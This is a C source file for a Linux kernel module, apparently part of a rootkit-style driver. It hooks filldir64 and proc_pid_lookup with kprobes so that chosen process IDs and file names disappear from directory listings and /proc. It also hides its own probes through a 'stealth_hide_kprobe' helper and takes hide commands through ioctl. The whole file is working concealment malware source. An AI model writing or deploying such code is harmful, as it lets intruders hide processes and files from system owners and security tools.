// SPDX-License-Identifier: GPL-2.0-only
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/mutex.h>
#include <linux/printk.h>
#include <linux/ptrace.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
#define DH_FILLDIR_CONTINUE 1UL
#else
#define DH_FILLDIR_CONTINUE 0UL
#endif

#include <driver/uapi.h>
#include "dirent_hide.h"
#include "kallsym.h"
#include "log.h"
#include "stealth_probe.h"

#define DIRENT_HIDE_NAME_MAX 64u
#define DIRENT_HIDE_NAME_SLOTS 16u

static int dirent_hide_register_kprobe_locked(void);

struct dirent_hide_name_entry {
	u8 in_use;
	u8 len;
	char name[DIRENT_HIDE_NAME_MAX];
};

static struct dirent_hide_name_entry hidden_names[DIRENT_HIDE_NAME_SLOTS];
static DEFINE_RAW_SPINLOCK(hidden_names_lock);

static pid_t hidden_pids[DIRENT_HIDE_MAX_PIDS];
static DEFINE_RAW_SPINLOCK(hidden_pids_lock);
static DEFINE_MUTEX(kp_lock);
static struct kprobe filldir_kp;
static bool kp_registered;

struct dirent_lookup_data { bool block; };
static struct kretprobe krp_pid_lookup;

static bool dirent_hide_name_matches(const char *name, int namlen) {
	unsigned long flags;
	unsigned int i;
	bool hit = false;
	if (!name || namlen <= 0 || (unsigned int)namlen >= DIRENT_HIDE_NAME_MAX) return false;
	raw_spin_lock_irqsave(&hidden_names_lock, flags);
	for (i = 0; i < DIRENT_HIDE_NAME_SLOTS; i++) {
		const struct dirent_hide_name_entry *e = &hidden_names[i];
		if (!e->in_use || e->len != (u8)namlen) continue;
		if (memcmp(e->name, name, namlen) == 0) { hit = true; break; }
	}
	raw_spin_unlock_irqrestore(&hidden_names_lock, flags);
	return hit;
}

int dirent_hide_name_add(const char *name) {
	unsigned long flags;
	unsigned int i, free_slot = DIRENT_HIDE_NAME_SLOTS;
	size_t len; int rc;
	if (!name) return -EINVAL;
	len = strnlen(name, DIRENT_HIDE_NAME_MAX);
	if (len == 0 || len >= DIRENT_HIDE_NAME_MAX) return -EINVAL;
	mutex_lock(&kp_lock);
	rc = dirent_hide_register_kprobe_locked();
	mutex_unlock(&kp_lock);
	if (rc) return rc;
	raw_spin_lock_irqsave(&hidden_names_lock, flags);
	for (i = 0; i < DIRENT_HIDE_NAME_SLOTS; i++) {
		if (hidden_names[i].in_use && hidden_names[i].len == (u8)len && memcmp(hidden_names[i].name, name, len) == 0) {
			raw_spin_unlock_irqrestore(&hidden_names_lock, flags); return 0;
		}
		if (!hidden_names[i].in_use && free_slot == DIRENT_HIDE_NAME_SLOTS) free_slot = i;
	}
	if (free_slot == DIRENT_HIDE_NAME_SLOTS) { raw_spin_unlock_irqrestore(&hidden_names_lock, flags); return -ENOSPC; }
	hidden_names[free_slot].in_use = 1;
	hidden_names[free_slot].len = (u8)len;
	memcpy(hidden_names[free_slot].name, name, len);
	hidden_names[free_slot].name[len] = 0;
	raw_spin_unlock_irqrestore(&hidden_names_lock, flags);
	return 0;
}

int dirent_hide_name_remove(const char *name) {
	unsigned long flags; unsigned int i; size_t len; int rc = -ENOENT;
	if (!name) return -EINVAL;
	len = strnlen(name, DIRENT_HIDE_NAME_MAX);
	if (len == 0 || len >= DIRENT_HIDE_NAME_MAX) return -EINVAL;
	raw_spin_lock_irqsave(&hidden_names_lock, flags);
	for (i = 0; i < DIRENT_HIDE_NAME_SLOTS; i++) {
		if (hidden_names[i].in_use && hidden_names[i].len == (u8)len && memcmp(hidden_names[i].name, name, len) == 0) {
			memset(&hidden_names[i], 0, sizeof(hidden_names[i])); rc = 0; break;
		}
	}
	raw_spin_unlock_irqrestore(&hidden_names_lock, flags);
	return rc;
}

void dirent_hide_name_clear(void) {
	unsigned long flags;
	raw_spin_lock_irqsave(&hidden_names_lock, flags);
	memset(hidden_names, 0, sizeof(hidden_names));
	raw_spin_unlock_irqrestore(&hidden_names_lock, flags);
}

static bool parse_pid_name(const char *name, int len, pid_t *out) {
	pid_t v = 0; int i;
	if (len <= 0 || len > 10) return false;
	if (len > 1 && name[0] == '0') return false;
	for (i = 0; i < len; i++) {
		unsigned int c = (unsigned char)name[i];
		if (c < '0' || c > '9') return false;
		v = v * 10 + (int)(c - '0');
		if (v < 0) return false;
	}
	*out = v; return true;
}

bool dirent_hide_pid_contains(pid_t pid) {
	unsigned long flags; bool hit = false; int i;
	if (pid <= 0) return false;
	raw_spin_lock_irqsave(&hidden_pids_lock, flags);
	for (i = 0; i < DIRENT_HIDE_MAX_PIDS; i++) {
		if (hidden_pids[i] == pid) { hit = true; break; }
	}
	raw_spin_unlock_irqrestore(&hidden_pids_lock, flags);
	return hit;
}

static int filldir64_pre(struct kprobe *p, struct pt_regs *regs) {
	const char *name; int namlen; unsigned int d_type; pid_t candidate;
	(void)p; if (!regs) return 0;
	name = (const char *)regs->regs[1]; namlen = (int)regs->regs[2];
	if (!name || namlen <= 0) return 0;
	d_type = (unsigned int)regs->regs[5];
	if (d_type == DT_DIR && parse_pid_name(name, namlen, &candidate) && dirent_hide_pid_contains(candidate)) goto spoof;
	if (dirent_hide_name_matches(name, namlen)) goto spoof;
	return 0;
spoof:
	regs->regs[0] = DH_FILLDIR_CONTINUE;
	instruction_pointer_set(regs, procedure_link_pointer(regs));
	return 1;
}

static int pid_lookup_entry(struct kretprobe_instance *ri, struct pt_regs *regs) {
	/* 修复：ri->data 是 char[]，必须强制转换，否则 -Werror 报不兼容指针 */
	struct dirent_lookup_data *d = (struct dirent_lookup_data *)ri->data;
	struct dentry *de = (struct dentry *)regs->regs[1];
	const unsigned char *n; long pid = 0;
	d->block = false;
	if (!de) return 0;
	n = de->d_name.name;
	if (!n || *n < '1' || *n > '9') return 0;
	while (*n >= '0' && *n <= '9') pid = pid * 10 + (*n++ - '0');
	d->block = dirent_hide_pid_contains((pid_t)pid);
	return 0;
}

static int pid_lookup_ret(struct kretprobe_instance *ri, struct pt_regs *regs) {
	/* 修复：同上，强制转换 */
	struct dirent_lookup_data *d = (struct dirent_lookup_data *)ri->data;
	if (d->block) regs->regs[0] = (unsigned long)(-ENOENT);
	return 0;
}

static int dirent_hide_register_kprobe_locked(void) {
	unsigned long addr; int rc;
	if (kp_registered) return 0;

	addr = kallsym_lookup("filldir64");
	if (!addr) return -ENOENT;

	memset(&filldir_kp, 0, sizeof(filldir_kp));
	filldir_kp.addr = (kprobe_opcode_t *)addr;
	filldir_kp.pre_handler = filldir64_pre;

	rc = register_kprobe(&filldir_kp);
	if (rc) return rc;

	stealth_hide_kprobe(&filldir_kp);

	memset(&krp_pid_lookup, 0, sizeof(krp_pid_lookup));
	krp_pid_lookup.entry_handler = pid_lookup_entry;
	krp_pid_lookup.handler = pid_lookup_ret;
	krp_pid_lookup.data_size = sizeof(struct dirent_lookup_data);
	krp_pid_lookup.maxactive = 16;
	krp_pid_lookup.kp.symbol_name = "proc_pid_lookup";

	if (register_kretprobe(&krp_pid_lookup) == 0) {
		stealth_hide_kprobe(&krp_pid_lookup.kp);
	}

	kp_registered = true;
	return 0;
}

int dirent_hide_init(void) { return 0; }

int dirent_hide_pid_add(pid_t pid) {
	unsigned long flags; int free_slot = -1; int i, rc;
	if (pid <= 0) return -EINVAL;
	mutex_lock(&kp_lock);
	rc = dirent_hide_register_kprobe_locked();
	mutex_unlock(&kp_lock);
	if (rc) return rc;
	raw_spin_lock_irqsave(&hidden_pids_lock, flags);
	for (i = 0; i < DIRENT_HIDE_MAX_PIDS; i++) {
		if (hidden_pids[i] == pid) { raw_spin_unlock_irqrestore(&hidden_pids_lock, flags); return 0; }
		if (hidden_pids[i] == 0 && free_slot < 0) free_slot = i;
	}
	if (free_slot < 0) { raw_spin_unlock_irqrestore(&hidden_pids_lock, flags); return -ENOSPC; }
	hidden_pids[free_slot] = pid;
	raw_spin_unlock_irqrestore(&hidden_pids_lock, flags);
	return 0;
}

int dirent_hide_pid_remove(pid_t pid) {
	unsigned long flags; int i;
	if (pid <= 0) return -EINVAL;
	raw_spin_lock_irqsave(&hidden_pids_lock, flags);
	for (i = 0; i < DIRENT_HIDE_MAX_PIDS; i++) {
		if (hidden_pids[i] == pid) {
			hidden_pids[i] = 0;
			raw_spin_unlock_irqrestore(&hidden_pids_lock, flags);
			return 0;
		}
	}
	raw_spin_unlock_irqrestore(&hidden_pids_lock, flags);
	return -ENOENT;
}

void dirent_hide_pid_clear(void) {
	unsigned long flags;
	raw_spin_lock_irqsave(&hidden_pids_lock, flags);
	memset(hidden_pids, 0, sizeof(hidden_pids));
	raw_spin_unlock_irqrestore(&hidden_pids_lock, flags);
}

int dirent_hide_pid_list(pid_t *out, size_t max) {
	unsigned long flags; int i, n = 0;
	if (!out || max == 0) return -EINVAL;
	raw_spin_lock_irqsave(&hidden_pids_lock, flags);
	for (i = 0; i < DIRENT_HIDE_MAX_PIDS && (size_t)n < max; i++) {
		if (hidden_pids[i] != 0) out[n++] = hidden_pids[i];
	}
	raw_spin_unlock_irqrestore(&hidden_pids_lock, flags);
	return n;
}

static long copy_and_hide_name(void __user *ubuf, u64 blen, int (*op)(const char *)) {
	char name[DIRENT_HIDE_NAME_MAX];
	if (!ubuf || blen == 0 || blen >= DIRENT_HIDE_NAME_MAX) return -EINVAL;
	if (copy_from_user(name, ubuf, blen) != 0) return -EFAULT;
	name[blen] = 0;
	return op(name);
}

long do_dirent_hide_cmd(unsigned int cmd, void __user *arg) {
	struct drv_ioctl_req req;
	pid_t list[DIRENT_HIDE_MAX_PIDS];
	int n;
	if (copy_from_user(&req, arg, sizeof(req)) != 0) return -EFAULT;
	switch (cmd) {
	case DRV_CMD_HIDE_PID_ADD: return dirent_hide_pid_add((pid_t)req.pid);
	case DRV_CMD_HIDE_PID_REMOVE: return dirent_hide_pid_remove((pid_t)req.pid);
	case DRV_CMD_HIDE_PID_CLEAR: dirent_hide_pid_clear(); return 0;
	case DRV_CMD_HIDE_PID_LIST:
		n = dirent_hide_pid_list(list, DIRENT_HIDE_MAX_PIDS);
		if (n < 0) return n;
		if (req.size < (u64)(n * sizeof(pid_t))) return -EMSGSIZE;
		if (copy_to_user((void __user *)(uintptr_t)req.buf, list, n * sizeof(pid_t)) != 0) return -EFAULT;
		req.size = (u64)n;
		if (copy_to_user(arg, &req, sizeof(req)) != 0) return -EFAULT;
		return 0;
	case DRV_CMD_HIDE_NAME_ADD: return copy_and_hide_name((void __user *)(uintptr_t)req.buf, req.size, dirent_hide_name_add);
	case DRV_CMD_HIDE_NAME_REMOVE: return copy_and_hide_name((void __user *)(uintptr_t)req.buf, req.size, dirent_hide_name_remove);
	case DRV_CMD_HIDE_NAME_CLEAR: dirent_hide_name_clear(); return 0;
	default: return -ENOTTY;
	}
}
